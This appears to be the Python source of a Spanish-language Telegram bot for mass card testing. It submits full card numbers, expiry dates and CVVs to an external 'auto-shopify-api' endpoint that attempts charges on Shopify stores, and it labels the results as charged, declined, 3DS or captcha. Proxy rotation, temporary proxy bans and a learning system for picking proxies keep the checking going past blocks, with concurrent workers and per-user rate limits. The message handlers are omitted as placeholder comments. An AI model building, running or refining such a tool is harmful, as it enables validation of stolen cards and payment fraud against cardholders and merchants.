# -*- coding: utf-8 -*-
"""
Bot de Telegram para verificar tarjetas - VERSIÓN OPTIMIZADA TIMEOUT
Con detección inteligente de proxies lentos, penalización dinámica y ajuste automático de workers.
"""

import os
import json
import logging
import asyncio
import time
import random
import sqlite3
import re
from collections import deque, defaultdict
from typing import Dict, List, Tuple, Optional, Any
from datetime import datetime, timedelta
from contextlib import asynccontextmanager
import math
from dataclasses import dataclass, field
from enum import Enum
import statistics
import signal
import sys

from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import aiohttp

# ================== MANEJO DE SEÑALES ==================
def handle_shutdown(signum, frame):
    logger.info(f"🛑 Recibida señal {signum}, cerrando gracefulmente...")
    sys.exit(0)

signal.signal(signal.SIGTERM, handle_shutdown)
signal.signal(signal.SIGINT, handle_shutdown)

# ================== CONFIGURACIÓN ==================
TOKEN = os.environ.get("BOT_TOKEN")
if not TOKEN:
    raise ValueError("❌ ERROR: BOT_TOKEN no está configurado")

API_ENDPOINTS = [
    os.environ.get("API_URL", "https://auto-shopify-api-production.up.railway.app/index.php"),
]

DB_FILE = os.environ.get("DB_FILE", "bot_database.db")
MAX_WORKERS_PER_USER = int(os.environ.get("MAX_WORKERS", 8))
RATE_LIMIT_SECONDS = int(os.environ.get("RATE_LIMIT", 2))
DAILY_LIMIT_CHECKS = int(os.environ.get("DAILY_LIMIT", 1000))
MASS_LIMIT_PER_HOUR = int(os.environ.get("MASS_LIMIT", 3))
ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "").split(",") if id]

# Configuración de timeouts optimizada
TIMEOUT_CONFIG = {
    "total": 8,        # Timeout total máximo
    "connect": 3,      # Tiempo máximo para establecer conexión
    "sock_read": 5,    # Tiempo máximo para leer datos
}

# Penalizaciones
PROXY_PENALIZACION = {
    "connect_timeout": 5.0,  # Penalización enorme para proxy que no conecta
    "read_timeout": 2.0,      # Penalización para sitio lento
    "timeout_count": 3,       # Máximo de timeouts antes de marcar como muerto
    "temp_ban_minutes": 15,   # Tiempo que un proxy permanece marcado como lento
}

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

INSTANCE_ID = os.environ.get("RAILWAY_DEPLOYMENT_ID", str(time.time()))

# ================== FUNCIONES AUXILIARES ==================
def create_progress_bar(current: int, total: int, width: int = 20) -> str:
    if total == 0:
        return "[" + "░" * width + "]"
    filled = int((current / total) * width)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}]"

def format_price(price_str: str) -> str:
    try:
        patterns = [
            r'\$?(\d+\.\d{2})',
            r'Price["\s:]+(\d+\.\d{2})',
            r'amount["\s:]+(\d+\.\d{2})',
        ]
        for pattern in patterns:
            match = re.search(pattern, price_str, re.IGNORECASE)
            if match:
                return f"${match.group(1)}"
    except:
        pass
    return "N/A"

async def get_bin_info(bin_code: str) -> Dict:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://lookup.binlist.net/{bin_code}", timeout=5) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return {
                        "bank": data.get("bank", {}).get("name", "Unknown"),
                        "brand": data.get("scheme", "Unknown").upper(),
                        "country": data.get("country", {}).get("alpha2", "UN"),
                    }
    except:
        pass
    return {"bank": "Unknown", "brand": "UNKNOWN", "country": "UN"}

# ================== ENUMS Y DATACLASSES ==================
class CheckStatus(Enum):
    CHARGED = "charged"
    DECLINED = "declined"
    TIMEOUT = "timeout"
    ERROR = "error"
    CAPTCHA = "captcha"
    THREE_DS = "3ds"

class TimeoutType(Enum):
    CONNECT = "connect"
    READ = "read"
    TOTAL = "total"

@dataclass
class CheckResult:
    card_bin: str
    card_last4: str
    site: str
    proxy: str
    status: CheckStatus
    response_time: float
    http_code: Optional[int]
    response_text: str
    success: bool = False
    bin_info: Dict = field(default_factory=dict)
    price: str = "$0.00"
    timeout_type: Optional[TimeoutType] = None

# ================== VALIDACIÓN DE TARJETAS ==================
class CardValidator:
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10 == 0

    @staticmethod
    def validate_expiry(month: str, year: str) -> bool:
        try:
            exp_month = int(month)
            exp_year = int(year)
            if len(year) == 2:
                exp_year += 2000
            now = datetime.now()
            if exp_year < now.year:
                return False
            if exp_year == now.year and exp_month < now.month:
                return False
            return True
        except:
            return False

    @staticmethod
    def validate_cvv(cvv: str) -> bool:
        return cvv.isdigit() and len(cvv) in (3, 4)

    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        parts = card_str.split('|')
        if len(parts) != 4:
            return None
        number, month, year, cvv = parts
        if not number.isdigit() or len(number) < 13 or len(number) > 19:
            return None
        if not CardValidator.luhn_check(number):
            return None
        if not CardValidator.validate_expiry(month, year):
            return None
        if not CardValidator.validate_cvv(cvv):
            return None
        return {
            "number": number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "bin": number[:6],
            "last4": number[-4:]
        }

# ================== DETECCIÓN INTELIGENTE ==================
def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
    line = line.strip()
    if not line:
        return None, None

    if line.startswith(('http://', 'https://')):
        return 'site', line

    if '|' in line:
        parts = line.split('|')
        if len(parts) == 4 and all(p.strip() for p in parts):
            return 'card', line

    if ':' in line:
        parts = line.split(':')
        if len(parts) in [2, 4] or (len(parts) == 3 and parts[2] == ''):
            return 'proxy', line

    return None, None

# ================== BASE DE DATOS ==================
class Database:
    def __init__(self, db_path=DB_FILE):
        self.db_path = db_path
        self._write_lock = asyncio.Lock()
        self._batch_queue = []
        self._batch_lock = asyncio.Lock()
        self._batch_task = None
        self._initialized = False
        
    def _init_db_sync(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA synchronous=NORMAL")
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    sites TEXT DEFAULT '[]',
                    proxies TEXT DEFAULT '[]',
                    cards TEXT DEFAULT '[]',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Tabla de aprendizaje con estadísticas de timeout
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS learning (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    site TEXT,
                    proxy TEXT,
                    attempts INTEGER DEFAULT 0,
                    successes INTEGER DEFAULT 0,
                    connect_timeouts INTEGER DEFAULT 0,
                    read_timeouts INTEGER DEFAULT 0,
                    total_time REAL DEFAULT 0,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    temp_banned_until TIMESTAMP,
                    UNIQUE(user_id, site, proxy)
                )
            ''')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_learning_user ON learning(user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_learning_tempban ON learning(temp_banned_until)')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    card_bin TEXT,
                    card_last4 TEXT,
                    site TEXT,
                    proxy TEXT,
                    status TEXT,
                    response_time REAL,
                    http_code INTEGER,
                    price TEXT,
                    bin_info TEXT,
                    response_text TEXT,
                    timeout_type TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_results_user ON results(user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_results_date ON results(created_at)')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS rate_limits (
                    user_id INTEGER PRIMARY KEY,
                    last_check TIMESTAMP,
                    checks_today INTEGER DEFAULT 0,
                    last_mass TIMESTAMP,
                    mass_count_hour INTEGER DEFAULT 0,
                    last_reset DATE DEFAULT CURRENT_DATE
                )
            ''')
            
            conn.commit()

    async def initialize(self):
        if self._initialized:
            return
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._init_db_sync)
        self._batch_task = asyncio.create_task(self._batch_processor())
        self._initialized = True
        logger.info(f"✅ Base de datos inicializada [Instancia: {INSTANCE_ID}]")

    async def _batch_processor(self):
        while True:
            try:
                await asyncio.sleep(5)
                if self._batch_queue:
                    async with self._batch_lock:
                        batch = self._batch_queue.copy()
                        self._batch_queue.clear()
                    
                    async with self._write_lock:
                        await self._execute_batch(batch)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Error en batch processor: {e}")

    async def _execute_batch(self, batch: List[tuple]):
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, self._sync_execute_batch, batch)
        except Exception as e:
            logger.error(f"Error en batch insert: {e}")

    def _sync_execute_batch(self, batch: List[tuple]):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.executemany(
                """INSERT INTO results 
                   (user_id, card_bin, card_last4, site, proxy, status, 
                    response_time, http_code, price, bin_info, response_text, timeout_type)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                batch
            )
            conn.commit()

    async def save_result(self, user_id: int, result: CheckResult):
        timeout_type = result.timeout_type.value if result.timeout_type else None
        async with self._batch_lock:
            self._batch_queue.append((
                user_id, result.card_bin, result.card_last4,
                result.site, result.proxy, result.status.value,
                result.response_time, result.http_code, result.price,
                json.dumps(result.bin_info), result.response_text[:500],
                timeout_type
            ))

    async def execute(self, query: str, params: tuple = ()):
        async with self._write_lock:
            loop = asyncio.get_event_loop()
            return await loop.run_in_executor(None, lambda: self._sync_execute(query, params))

    def _sync_execute(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(query, params)
            conn.commit()
            return cursor

    async def fetch_one(self, query: str, params: tuple = ()):
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, lambda: self._sync_fetch_one(query, params))

    def _sync_fetch_one(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(query, params)
            row = cursor.fetchone()
            return dict(row) if row else None

    async def fetch_all(self, query: str, params: tuple = ()):
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, lambda: self._sync_fetch_all(query, params))

    def _sync_fetch_all(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(query, params)
            return [dict(row) for row in cursor.fetchall()]

    async def cleanup_old_results(self, days: int = 7):
        await self.execute(
            "DELETE FROM results WHERE created_at < date('now', ?)",
            (f"-{days} days",)
        )

    async def shutdown(self):
        if self._batch_task:
            self._batch_task.cancel()
            try:
                await self._batch_task
            except asyncio.CancelledError:
                pass

# ================== PROXY HEALTH CHECKER MEJORADO ==================
class ProxyHealthChecker:
    def __init__(self, db: Database, user_id: int):
        self.db = db
        self.user_id = user_id
        self.test_url = "https://httpbin.org/ip"
        self.timeout = aiohttp.ClientTimeout(
            total=TIMEOUT_CONFIG["total"],
            connect=TIMEOUT_CONFIG["connect"],
            sock_read=TIMEOUT_CONFIG["sock_read"]
        )
        
    async def check_proxy(self, proxy: str) -> Dict:
        start_time = time.time()
        result = {
            "proxy": proxy,
            "alive": False,
            "response_time": 0,
            "error": None,
            "ip": None,
            "timeout_type": None
        }
        
        try:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            else:
                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                async with session.get(self.test_url, proxy=proxy_url) as resp:
                    if resp.status == 200:
                        elapsed = time.time() - start_time
                        if elapsed < 4:  # Solo considerar vivos los rápidos
                            result["alive"] = True
                            result["response_time"] = elapsed
                            try:
                                data = await resp.json()
                                result["ip"] = data.get("origin", "Unknown")
                            except:
                                pass
                        else:
                            result["error"] = f"Too slow: {elapsed:.2f}s"
        except asyncio.TimeoutError as e:
            # Determinar tipo de timeout
            if "connect" in str(e).lower():
                result["error"] = "Connect timeout"
                result["timeout_type"] = "connect"
            else:
                result["error"] = "Read timeout"
                result["timeout_type"] = "read"
        except Exception as e:
            result["error"] = str(e)[:50]
        
        return result
    
    async def check_all_proxies(self, proxies: List[str], max_concurrent: int = 25) -> List[Dict]:
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def check_with_semaphore(proxy):
            async with semaphore:
                return await self.check_proxy(proxy)
        
        tasks = [check_with_semaphore(p) for p in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        final_results = []
        for i, res in enumerate(results):
            if isinstance(res, Exception):
                final_results.append({
                    "proxy": proxies[i],
                    "alive": False,
                    "response_time": 0,
                    "error": str(res),
                    "ip": None,
                    "timeout_type": None
                })
            else:
                final_results.append(res)
        
        return final_results

# ================== SISTEMA DE APRENDIZAJE CON PENALIZACIÓN DE TIMEOUT ==================
class LearningSystem:
    def __init__(self, db: Database, user_id: int):
        self.db = db
        self.user_id = user_id
        self.BASE_EPSILON = 0.15
        self.MIN_EPSILON = 0.05
        self._lock = asyncio.Lock()

    async def _clean_temp_bans(self):
        """Limpia bans temporales expirados"""
        await self.db.execute(
            "UPDATE learning SET temp_banned_until = NULL WHERE temp_banned_until < CURRENT_TIMESTAMP"
        )

    async def update(self, result: CheckResult):
        async with self._lock:
            await self._clean_temp_bans()
            
            existing = await self.db.fetch_one(
                "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ?",
                (self.user_id, result.site, result.proxy)
            )
            
            if existing:
                attempts = existing["attempts"] + 1
                successes = existing["successes"] + (1 if result.success else 0)
                connect_timeouts = existing["connect_timeouts"]
                read_timeouts = existing["read_timeouts"]
                total_time = existing["total_time"] + result.response_time
                
                # Incrementar contadores según tipo de timeout
                if result.status == CheckStatus.TIMEOUT:
                    if result.timeout_type == TimeoutType.CONNECT:
                        connect_timeouts += 1
                    else:
                        read_timeouts += 1
                
                # Si hay demasiados timeouts de conexión, banear temporalmente
                temp_banned_until = existing["temp_banned_until"]
                if connect_timeouts >= PROXY_PENALIZACION["timeout_count"]:
                    if not temp_banned_until:
                        ban_minutes = PROXY_PENALIZACION["temp_ban_minutes"]
                        temp_banned_until = (datetime.now() + timedelta(minutes=ban_minutes)).isoformat()
                
                await self.db.execute(
                    """UPDATE learning SET 
                       attempts = ?, successes = ?, connect_timeouts = ?, read_timeouts = ?,
                       total_time = ?, last_seen = CURRENT_TIMESTAMP, temp_banned_until = ?
                       WHERE id = ?""",
                    (attempts, successes, connect_timeouts, read_timeouts, total_time,
                     temp_banned_until, existing["id"])
                )
            else:
                connect_timeouts = 1 if (result.status == CheckStatus.TIMEOUT and 
                                        result.timeout_type == TimeoutType.CONNECT) else 0
                read_timeouts = 1 if (result.status == CheckStatus.TIMEOUT and 
                                     result.timeout_type == TimeoutType.READ) else 0
                
                temp_banned_until = None
                if connect_timeouts >= PROXY_PENALIZACION["timeout_count"]:
                    ban_minutes = PROXY_PENALIZACION["temp_ban_minutes"]
                    temp_banned_until = (datetime.now() + timedelta(minutes=ban_minutes)).isoformat()
                
                await self.db.execute(
                    """INSERT INTO learning 
                       (user_id, site, proxy, attempts, successes, connect_timeouts, read_timeouts,
                        total_time, temp_banned_until)
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (self.user_id, result.site, result.proxy, 1, 1 if result.success else 0,
                     connect_timeouts, read_timeouts, result.response_time, temp_banned_until)
                )

    async def get_score(self, site: str, proxy: str) -> float:
        """Calcula score con penalización por timeouts"""
        # Limpiar bans temporales
        await self._clean_temp_bans()
        
        row = await self.db.fetch_one(
            "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ?",
            (self.user_id, site, proxy)
        )
        
        # Si no hay datos o está baneado, score bajo
        if not row or row["attempts"] < 3 or row["temp_banned_until"]:
            return 0.1
        
        attempts = row["attempts"]
        successes = row["successes"]
        connect_timeouts = row["connect_timeouts"]
        read_timeouts = row["read_timeouts"]
        avg_time = row["total_time"] / attempts
        
        # Fórmula con penalizaciones
        success_rate = successes / attempts
        connect_penalty = (connect_timeouts / attempts) * PROXY_PENALIZACION["connect_timeout"]
        read_penalty = (read_timeouts / attempts) * PROXY_PENALIZACION["read_timeout"]
        
        # Penalizar proxies lentos
        speed_score = 1.0 / (avg_time + 1.0)
        if avg_time > 4:  # Más de 4s es muy lento
            speed_score *= 0.3
        
        score = (success_rate * 2.0) - connect_penalty - read_penalty + speed_score
        return max(0.1, min(2.0, score))

    async def choose_combination(self, sites: List[str], proxies: List[str]) -> Tuple[str, str]:
        """Elige combinación evitando proxies baneados temporalmente"""
        await self._clean_temp_bans()
        
        # Filtrar proxies baneados
        available_proxies = []
        for proxy in proxies:
            row = await self.db.fetch_one(
                "SELECT temp_banned_until FROM learning WHERE user_id = ? AND proxy = ?",
                (self.user_id, proxy)
            )
            if not row or not row["temp_banned_until"]:
                available_proxies.append(proxy)
        
        if not available_proxies:
            available_proxies = proxies  # Si todos están baneados, usar todos
        
        # Epsilon-greedy
        if random.random() < self.BASE_EPSILON:
            return random.choice(sites), random.choice(available_proxies)
        
        scores = []
        for site in sites:
            for proxy in available_proxies:
                score = await self.get_score(site, proxy)
                scores.append((score, site, proxy))
        
        scores.sort(reverse=True)
        return scores[0][1], scores[0][2]

# ================== CHECKER CON TIMEOUT OPTIMIZADO ==================
class UltraFastChecker:
    def __init__(self):
        self.connector = None
        self.session_pool = deque(maxlen=30)
        self._initialized = False
        self._timeout_stats = defaultdict(lambda: {"connect": 0, "read": 0})
        
    async def initialize(self):
        if self._initialized:
            return
        self.connector = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)
        await self._create_sessions()
        self._initialized = True
        logger.info(f"✅ Checker inicializado [Instancia: {INSTANCE_ID}]")

    async def _create_sessions(self):
        for _ in range(30):
            session = aiohttp.ClientSession(
                connector=self.connector,
                timeout=aiohttp.ClientTimeout(
                    total=TIMEOUT_CONFIG["total"],
                    connect=TIMEOUT_CONFIG["connect"],
                    sock_read=TIMEOUT_CONFIG["sock_read"]
                )
            )
            self.session_pool.append(session)

    async def get_session(self):
        if not self._initialized:
            await self.initialize()
        if not self.session_pool:
            return aiohttp.ClientSession(connector=self.connector)
        return self.session_pool.popleft()

    async def return_session(self, session):
        if not session.closed:
            self.session_pool.append(session)

    async def shutdown(self):
        self._initialized = False
        while self.session_pool:
            s = self.session_pool.popleft()
            try:
                await s.close()
            except:
                pass
        if self.connector:
            await self.connector.close()

    async def check_card(self, site: str, proxy: str, card_data: Dict) -> CheckResult:
        card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
        params = {"site": site, "cc": card_str, "proxy": proxy}
        
        session = await self.get_session()
        start_time = time.time()
        bin_info = await get_bin_info(card_data['bin'])
        
        try:
            async with session.get(API_ENDPOINTS[0], params=params) as resp:
                elapsed = time.time() - start_time
                response_text = await resp.text()
                
                status = CheckStatus.ERROR
                success = False
                
                if "Thank You" in response_text or "CHARGED" in response_text:
                    status = CheckStatus.CHARGED
                    success = True
                elif "3DS" in response_text:
                    status = CheckStatus.THREE_DS
                elif "CAPTCHA" in response_text:
                    status = CheckStatus.CAPTCHA
                elif "DECLINE" in response_text:
                    status = CheckStatus.DECLINED
                
                price = format_price(response_text)
                
                return CheckResult(
                    card_bin=card_data['bin'],
                    card_last4=card_data['last4'],
                    site=site,
                    proxy=proxy,
                    status=status,
                    response_time=elapsed,
                    http_code=resp.status,
                    response_text=response_text,
                    success=success,
                    bin_info=bin_info,
                    price=price
                )
                
        except asyncio.TimeoutError as e:
            elapsed = time.time() - start_time
            timeout_type = TimeoutType.TOTAL
            
            # Determinar tipo de timeout por el mensaje de error
            error_str = str(e).lower()
            if "connect" in error_str:
                timeout_type = TimeoutType.CONNECT
            elif "read" in error_str:
                timeout_type = TimeoutType.READ
            
            return CheckResult(
                card_bin=card_data['bin'],
                card_last4=card_data['last4'],
                site=site,
                proxy=proxy,
                status=CheckStatus.TIMEOUT,
                response_time=elapsed,
                http_code=None,
                response_text="",
                success=False,
                bin_info=bin_info,
                price="$0.00",
                timeout_type=timeout_type
            )
        except Exception as e:
            elapsed = time.time() - start_time
            return CheckResult(
                card_bin=card_data['bin'],
                card_last4=card_data['last4'],
                site=site,
                proxy=proxy,
                status=CheckStatus.ERROR,
                response_time=elapsed,
                http_code=None,
                response_text=str(e),
                success=False,
                bin_info=bin_info,
                price="$0.00"
            )
        finally:
            await self.return_session(session)

# ================== USER MANAGER CON AJUSTE DINÁMICO DE WORKERS ==================
class UserManager:
    def __init__(self, db: Database):
        self.db = db
        self._rate_lock = asyncio.Lock()
        self._worker_stats = defaultdict(lambda: {"timeouts": 0, "total": 0})

    async def get_user_data(self, user_id: int) -> Dict:
        row = await self.db.fetch_one(
            "SELECT sites, proxies, cards FROM users WHERE user_id = ?",
            (user_id,)
        )
        
        if not row:
            await self.db.execute(
                "INSERT INTO users (user_id, sites, proxies, cards) VALUES (?, ?, ?, ?)",
                (user_id, '[]', '[]', '[]')
            )
            return {"sites": [], "proxies": [], "cards": []}
        
        return {
            "sites": json.loads(row["sites"]),
            "proxies": json.loads(row["proxies"]),
            "cards": json.loads(row["cards"])
        }

    async def update_user_data(self, user_id: int, sites=None, proxies=None, cards=None):
        current = await self.get_user_data(user_id)
        
        if sites is not None:
            current["sites"] = sites
        if proxies is not None:
            current["proxies"] = proxies
        if cards is not None:
            current["cards"] = cards
        
        await self.db.execute(
            "UPDATE users SET sites = ?, proxies = ?, cards = ? WHERE user_id = ?",
            (json.dumps(current["sites"]), json.dumps(current["proxies"]), 
             json.dumps(current["cards"]), user_id)
        )

    async def get_optimal_workers(self, user_id: int, requested: int) -> int:
        """Calcula número óptimo de workers basado en tasa de timeout"""
        stats = self._worker_stats[user_id]
        if stats["total"] == 0:
            return min(requested, MAX_WORKERS_PER_USER)
        
        timeout_rate = stats["timeouts"] / stats["total"]
        
        if timeout_rate > 0.2:  # Más de 20% timeouts
            return max(1, requested // 2)  # Reducir a la mitad
        elif timeout_rate > 0.1:  # 10-20% timeouts
            return max(1, int(requested * 0.75))  # Reducir 25%
        else:
            return min(requested, MAX_WORKERS_PER_USER)

    async def record_check_result(self, user_id: int, result: CheckResult):
        """Registra resultado para estadísticas de workers"""
        if result.status == CheckStatus.TIMEOUT:
            self._worker_stats[user_id]["timeouts"] += 1
        self._worker_stats[user_id]["total"] += 1

    async def check_rate_limit(self, user_id: int, command: str) -> Tuple[bool, str]:
        async with self._rate_lock:
            today = datetime.now().date()
            
            row = await self.db.fetch_one(
                "SELECT * FROM rate_limits WHERE user_id = ?",
                (user_id,)
            )
            
            if not row:
                await self.db.execute(
                    """INSERT INTO rate_limits 
                       (user_id, last_check, checks_today, last_mass, mass_count_hour, last_reset)
                       VALUES (?, ?, ?, ?, ?, ?)""",
                    (user_id, datetime.now(), 0, None, 0, today)
                )
                return True, ""
            
            last_reset = datetime.fromisoformat(row["last_reset"]).date()
            if last_reset < today:
                await self.db.execute(
                    "UPDATE rate_limits SET checks_today = 0, mass_count_hour = 0, last_reset = ? WHERE user_id = ?",
                    (today, user_id)
                )
                checks_today = 0
                mass_count_hour = 0
            else:
                checks_today = row["checks_today"]
                mass_count_hour = row["mass_count_hour"]
            
            if command == "mass":
                if mass_count_hour >= MASS_LIMIT_PER_HOUR:
                    return False, f"⚠️ Máximo {MASS_LIMIT_PER_HOUR} mass/hora"
                
                if row.get("last_mass"):
                    last_mass = datetime.fromisoformat(row["last_mass"])
                    elapsed = (datetime.now() - last_mass).seconds
                    if elapsed < 60:
                        wait = 60 - elapsed
                        return False, f"⏳ Espera {wait}s para otro mass"
            
            elif command == "check":
                if checks_today >= DAILY_LIMIT_CHECKS:
                    return False, f"📅 Límite diario ({DAILY_LIMIT_CHECKS}) alcanzado"
                
                if row.get("last_check"):
                    last_check = datetime.fromisoformat(row["last_check"])
                    elapsed = (datetime.now() - last_check).seconds
                    if elapsed < RATE_LIMIT_SECONDS:
                        wait = RATE_LIMIT_SECONDS - elapsed
                        return False, f"⏳ Espera {wait}s"
            
            return True, ""

    async def increment_checks(self, user_id: int, command: str):
        now = datetime.now()
        
        if command == "mass":
            await self.db.execute(
                """UPDATE rate_limits SET 
                   mass_count_hour = mass_count_hour + 1,
                   last_mass = ?
                   WHERE user_id = ?""",
                (now, user_id)
            )
        else:
            await self.db.execute(
                """UPDATE rate_limits SET 
                   checks_today = checks_today + 1,
                   last_check = ?
                   WHERE user_id = ?""",
                (now, user_id)
            )

    async def is_admin(self, user_id: int) -> bool:
        return user_id in ADMIN_IDS

    async def ban_user(self, admin_id: int, target_id: int, minutes: int = 60) -> bool:
        if not await self.is_admin(admin_id):
            return False
        ban_until = datetime.now() + timedelta(minutes=minutes)
        await self.db.execute(
            "UPDATE rate_limits SET banned_until = ? WHERE user_id = ?",
            (ban_until, target_id)
        )
        return True

    async def unban_user(self, admin_id: int, target_id: int) -> bool:
        if not await self.is_admin(admin_id):
            return False
        await self.db.execute(
            "UPDATE rate_limits SET banned_until = NULL WHERE user_id = ?",
            (target_id,)
        )
        return True

# ================== CARD CHECK SERVICE CON AJUSTE DINÁMICO ==================
class CardCheckService:
    def __init__(self, db: Database, user_manager: UserManager, checker: UltraFastChecker):
        self.db = db
        self.user_manager = user_manager
        self.checker = checker

    async def check_single(self, user_id: int, card_data: Dict, site: str, proxy: str) -> CheckResult:
        result = await self.checker.check_card(site, proxy, card_data)
        await self.db.save_result(user_id, result)
        
        learning = LearningSystem(self.db, user_id)
        await learning.update(result)
        await self.user_manager.record_check_result(user_id, result)
        
        return result

    async def check_mass(
        self, 
        user_id: int,
        cards: List[Dict],
        sites: List[str],
        proxies: List[str],
        num_workers: int,
        progress_callback=None
    ) -> Tuple[List[CheckResult], int, float]:
        
        # Obtener número óptimo de workers
        optimal_workers = await self.user_manager.get_optimal_workers(user_id, num_workers)
        
        queue = asyncio.Queue()
        for card in cards:
            await queue.put(card)
        
        result_queue = asyncio.Queue()
        processed = 0
        success_count = 0
        start_time = time.time()
        learning = LearningSystem(self.db, user_id)
        
        async def worker(worker_id: int):
            worker_processed = 0
            worker_success = 0
            
            while not queue.empty() and not cancel_mass.get(user_id, False):
                try:
                    card_data = await asyncio.wait_for(queue.get(), timeout=1.0)
                except asyncio.TimeoutError:
                    break
                
                site, proxy = await learning.choose_combination(sites, proxies)
                result = await self.checker.check_card(site, proxy, card_data)
                
                # Registrar resultado para estadísticas
                await self.user_manager.record_check_result(user_id, result)
                
                worker_processed += 1
                if result.success:
                    worker_success += 1
                
                await result_queue.put(result)
                
                if progress_callback and worker_processed % 5 == 0:
                    current_processed = processed + worker_processed
                    current_success = success_count + worker_success
                    await progress_callback(current_processed, current_success, len(cards))
            
            return worker_processed, worker_success
        
        # Lanzar workers con número óptimo
        tasks = [asyncio.create_task(worker(i)) for i in range(optimal_workers)]
        
        # Recolectar resultados
        results = []
        while len(results) < len(cards) and not all(t.done() for t in tasks):
            try:
                result = await asyncio.wait_for(result_queue.get(), timeout=0.1)
                results.append(result)
                processed += 1
                if result.success:
                    success_count += 1
            except asyncio.TimeoutError:
                continue
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        while not result_queue.empty():
            result = await result_queue.get()
            results.append(result)
            processed += 1
            if result.success:
                success_count += 1
        
        elapsed = time.time() - start_time
        return results, success_count, elapsed

# ================== VARIABLES GLOBALES ==================
db = None
user_manager = None
checker = None
card_service = None
cancel_mass = {}

# ================== HANDLERS ==================
# [Los handlers se mantienen igual que en la versión anterior]
# ... (mantener todos los handlers existentes)

# ================== MAIN ==================
async def shutdown(application: Application):
    logger.info("🛑 Cerrando...")
    if checker:
        await checker.shutdown()
    if db:
        await db.shutdown()
    logger.info("✅ Cerrado")

async def post_init(application: Application):
    global db, user_manager, checker, card_service
    
    db = Database()
    await db.initialize()
    await db.cleanup_old_results()
    
    user_manager = UserManager(db)
    checker = UltraFastChecker()
    await checker.initialize()
    
    card_service = CardCheckService(db, user_manager, checker)
    
    logger.info("✅ Bot inicializado con optimizaciones de timeout")

def main():
    app = Application.builder().token(TOKEN).post_init(post_init).build()
    app.post_shutdown = shutdown

    # Registrar handlers (igual que antes)
    # ...

    logger.info("🚀 Bot iniciado con optimizaciones de timeout")
    app.run_polling()

if __name__ == "__main__":
    main()
